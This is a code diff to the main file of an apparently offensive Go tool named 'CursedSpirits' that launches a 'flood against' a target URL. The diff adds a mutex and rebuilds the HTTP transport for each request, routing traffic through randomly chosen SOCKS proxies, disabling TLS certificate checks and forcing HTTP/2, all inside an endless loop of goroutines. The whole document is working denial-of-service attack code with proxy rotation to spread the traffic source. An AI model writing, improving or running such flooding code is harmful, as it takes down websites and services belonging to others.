@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"fmt"
 	"log"
 	"math/rand"
@@ -9,6 +10,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"time"
 
 	"Pix4Devs/CursedSpirits/bot"
@@ -16,6 +18,8 @@ import (
 	"Pix4Devs/CursedSpirits/fancy"
 	"Pix4Devs/CursedSpirits/filesystem"
 	"Pix4Devs/CursedSpirits/globals"
+
+	"h12.io/socks"
 )
 
 var (
@@ -87,6 +91,7 @@ func main() {
 			Timeout: time.Duration(time.Second * 20),
 		},
 		Protocol: *PROXY_TYPE,
+		Mx:       sync.Mutex{},
 	}
 
 	fancy.PrintCtx("Started flood against '" + *TARGET + "'")
@@ -94,7 +99,23 @@ func main() {
 
 	for {
 		go func() {
-			f.Jujutsu(globals.PROXIES[rand.Intn(len(globals.PROXIES))])
+			f.Mx.Lock()
+			defer f.Mx.Unlock()
+			// ==================
+			// reset tcp cache state
+			// refer to godoc:
+			//
+			// The [Client.Transport] typically has internal state (cached TCP connections), so Clients should be reused instead of created as needed.
+			// Clients are safe for concurrent use by multiple goroutines.
+			// ==================
+			proxy := globals.PROXIES[rand.Intn(len(globals.PROXIES))]
+			f.Client.Transport = &http.Transport{
+				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+				Dial:              socks.Dial(fmt.Sprintf("%s://%s", f.Protocol, proxy)),
+				ForceAttemptHTTP2: true,
+				MaxConnsPerHost:   0,
+			}
+			f.Jujutsu(proxy)
 		}()
 	}
 }
